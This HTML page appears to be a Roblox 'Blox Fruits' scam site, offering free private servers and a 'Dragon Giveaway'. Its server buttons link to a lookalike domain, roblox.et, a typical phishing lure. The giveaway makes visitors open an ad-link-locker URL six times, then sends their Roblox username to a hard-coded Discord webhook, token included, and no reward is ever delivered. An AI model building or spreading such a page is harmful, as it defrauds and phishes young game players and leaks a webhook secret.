<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOLD SERVERS</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(to right, #2e026d, #15162c);
            color: white;
            text-align: center;
            padding: 20px;
            overflow-x: hidden;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { box-shadow: 0 0 15px rgba(255, 255, 255, 0.1); }
            to { box-shadow: 0 0 30px rgba(255, 255, 255, 0.5); }
        }
        nav a {
            color: white;
            text-decoration: none;
            margin: 0 15px;
            font-weight: bold;
            transition: color 0.3s;
        }
        nav a:hover {
            color: #FFD700;
        }
        .server, .giveaway, .feedback-form {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            margin: 20px auto;
            width: 60%;
            border-radius: 15px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
            border: 1px solid #6a0dad;
        }
        .fireflies {
            position: fixed;
            width: 100%;
            height: 100%;
            overflow: hidden;
            top: 0;
            left: 0;
            z-index: -1;
        }
        .firefly {
            position: absolute;
            width: 5px;
            height: 5px;
            background: #fff;
            border-radius: 50%;
            animation: fly 10s infinite ease-in-out;
        }
        @keyframes fly {
            0% { transform: translateY(0) translateX(0); opacity: 0.5; }
            50% { transform: translateY(-200px) translateX(200px); opacity: 1; }
            100% { transform: translateY(0) translateX(0); opacity: 0.5; }
        }
        .button {
            background-color: #FFD700;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
        }
        .button:hover {
            background-color: #FFA500;
        }
        .warning {
            color: #FF4500;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="fireflies"></div>
    <header>
        <h1 style="color: #A020F0; animation: glow 2s infinite alternate;">GOLD SERVERS</h1>
        <nav>
            <a href="#">Home</a>
            <a href="#dashboard">Dashboard</a>
            <a href="#feedback">Feedback</a>
        </nav>
    </header><main>
    <div id="server-list"></div>

    <section class="giveaway">
        <h2>üêâ Dragon Giveaway üêâ</h2>
        <p class="warning">If you try to skip all the challenges, you will not get anything.</p>
        <p>Complete <strong>6 times</strong> to claim your reward!</p>
        <button class="button" id="giveaway-btn">Start Giveaway</button>
        <div id="completion-count"></div>
        <div id="username-form" style="display:none;">
            <input type="text" id="roblox-username" placeholder="Enter your Roblox username" required>
            <button class="button" id="submit-username">Submit</button>
        </div>
    </section>

    <section class="feedback-form" id="feedback">
        <h2>Report Bugs / Rate Our Site</h2>
        <form id="feedback-form">
            <input type="text" id="feedback-user" placeholder="Enter your Roblox username" required>
            <textarea id="feedback-message" placeholder="Your feedback..." required></textarea>
            <button type="submit" class="button">Submit Feedback</button>
        </form>
    </section>
</main>

<script>
    const servers = [
        {
            name: "BloxFruit Server 1",
            link: "https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756"
        },
        {
            name: "BloxFruit Server 2",
            link: "https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756"
        }
    ];

    const serverList = document.getElementById('server-list');

    servers.forEach(server => {
        const section = document.createElement('section');
        section.className = 'server';
        section.innerHTML = `<h2>${server.name}</h2><button class="button" onclick="window.open('${server.link}', '_blank')">Join Server</button>`;
        serverList.appendChild(section);
    });

    let completionCount = 0;
    const giveawayBtn = document.getElementById('giveaway-btn');
    const completionDiv = document.getElementById('completion-count');
    const usernameForm = document.getElementById('username-form');

    giveawayBtn.addEventListener('click', () => {
        window.open('https://lootdest.org/s?Lx3KSO1X', '_blank');
        completionCount++;
        completionDiv.innerHTML = `Completed: ${completionCount}/6`;

        if (completionCount >= 6) {
            giveawayBtn.style.display = 'none';
            usernameForm.style.display = 'block';
        }
    });

    document.getElementById('submit-username').addEventListener('click', () => {
        const username = document.getElementById('roblox-username').value;
        if (username) {
            fetch('https://discord.com/api/webhooks/1306937711487225877/Ju3ztbYdukimRh_bqZMVZrWxslY77xBC26-XIAerse7EYgLJHIcviu4_QGcWKolQ3tpw', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [{
                        title: 'üéâ Dragon Giveaway Completed! üéâ',
                        description: `Roblox Username: **${username}**`,
                        color: 0xFFD700
                    }]
                })
            }).then(() => {
                alert('Username submitted!');
                usernameForm.style.display = 'none';
            }).catch(() => {
                alert('Failed to submit. Try again.');
            });
        } else {
            alert('Please enter your Roblox username.');
        }
    });

    document.getElementById('feedback-form').addEventListener('submit', (e) => {
        e.preventDefault();
        const username = document.getElementById('feedback-user').value;
        const message = document.getElementById('feedback-message').value;

        if (username && message) {
            alert('Feedback submitted!');
        } else {
            alert('Please fill out all fields.');
        }
    });
</script>

</body>
</html>
